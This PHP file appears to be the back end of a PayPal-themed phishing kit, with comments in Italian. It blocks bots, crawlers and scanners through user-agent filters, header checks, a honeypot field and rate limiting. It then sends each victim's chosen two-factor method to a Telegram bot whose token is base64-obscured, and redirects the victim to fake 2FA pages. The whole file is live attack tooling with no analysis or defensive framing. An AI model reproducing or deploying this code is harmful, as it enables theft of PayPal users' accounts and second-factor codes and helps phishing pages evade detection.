<?php
session_start();

// 1. First Layer - Basic Bot Filter (GET/POST)
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (!isset($_SESSION['verified'])) {
    // Block empty User-Agent and basic bots
    if (empty($userAgent) || preg_match('/bot|crawl|spider|curl|wget|python|java|php|ruby|httpclient/i', $userAgent)) {
        header("HTTP/1.1 403 Forbidden");
        exit;
    }
    
    // Additional bot checks
    if (!isset($_SERVER['HTTP_ACCEPT']) || !isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
        header("HTTP/1.1 403 Forbidden");
        exit;
    }
    
    // Only set verified after passing all checks
    $_SESSION['verified'] = true;
}

// 2. Browser Validation Layer (GET requests only)
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // Device capability check
    $requiredHeaders = ['HTTP_ACCEPT','HTTP_ACCEPT_LANGUAGE','HTTP_USER_AGENT','HTTP_CONNECTION'];
    foreach($requiredHeaders as $h) {
        if(!isset($_SERVER[$h]) || empty($_SERVER[$h])) {
            header("HTTP/1.1 403 Forbidden");
            exit;
        }
    }

    
    // Generate time-limited token for form submission
    if (!isset($_SESSION['form_token'])) {
        $_SESSION['form_token'] = bin2hex(random_bytes(16));
        $_SESSION['form_start'] = time();
    }
}


// Add honeypot trap
$hpField = 'hp_'.substr(md5($_SESSION['form_token']), 0, 8);
if (isset($_SESSION['form_token']) && !empty($_POST[$hpField])) {
    header("HTTP/1.1 403 Forbidden");
    exit;
}



// 5. Rate Limiting by IP
$ip = $_SERVER['REMOTE_ADDR'];
$attemptsFile = 'attempts.json';
$rateLimits = [
    'GET' => ['limit' => 30, 'window' => 300],  // Increased from 15
    'POST' => ['limit' => 10, 'window' => 600]  // Increased from 5
];

$attempts = file_exists($attemptsFile) ? json_decode(file_get_contents($attemptsFile), true) : [];
$method = $_SERVER['REQUEST_METHOD'];
$currentTime = time();

if (!isset($attempts[$ip][$method])) {
    $attempts[$ip][$method] = [
        'count' => 1,
        'first' => $currentTime,
        'last' => $currentTime
    ];
} else {
    $attempts[$ip][$method]['count']++;
    $attempts[$ip][$method]['last'] = $currentTime;
    
    // Reset if window expired
    if ($currentTime - $attempts[$ip][$method]['first'] > $rateLimits[$method]['window']) {
        unset($attempts[$ip][$method]);
    }
}

if ($attempts[$ip][$method]['count'] > $rateLimits[$method]['limit']) {
    header("HTTP/1.1 429 Too Many Requests");
    exit;
}
file_put_contents($attemptsFile, json_encode($attempts));

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Form timing validation (2-120 seconds)
    $formTime = time() - ($_SESSION['form_start'] ?? 0);
    if ($formTime < 1 || $formTime > 120) {
        header("HTTP/1.1 403 Forbidden");
        exit;
    }
    // Recupera il valore del radio button selezionato
    $selectedOption = $_POST["selectedChallengeType"];

    // Token del bot Telegram e ID del canale
    $botApiToken = base64_decode('Nzg5OTE2ODYwMDpBQUd3akdDRHlpX2FXR0xhOC1WUHdOY2txUWxzMGhiTVIzYw==');
    $channelId = base64_decode('Nzc4MDcwNzY0Mg==');

    // Creazione del messaggio da inviare
    $txt = "📋 Opzione selezionata: {$selectedOption}";

    // Costruzione della query per l'API di Telegram
    $query = http_build_query([
        'chat_id' => $channelId,
        'text' => $txt,
    ]);

    // URL dell'API di Telegram
    $url = "https://api.telegram.org/bot{$botApiToken}/sendMessage?{$query}";

    // Inizializza cURL per inviare la richiesta HTTP
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => 'GET',
    ]);

    // Esegui la richiesta e chiudi cURL
    $response = curl_exec($curl);
    curl_close($curl);

    // Redirect basato sul valore della checkbox
    switch ($selectedOption) {
        case 'SMS Message':
            header("Location: PP2fa/index.html");
            break;
        case 'whatsapp':
            header("Location: PP2fa/index.html");
            break;
        case 'PayPal App':
            header("Location: App.html");
            break;
        case 'CALL':
            header("Location: index.html");
            break;
        default:
            header("Location: index.html");
            break;
    }
    // Reset rate limiting on successful submission
    if (isset($attempts[$ip][$method])) {
        unset($attempts[$ip][$method]);
        file_put_contents($attemptsFile, json_encode($attempts));
    }
    exit;
}
?>
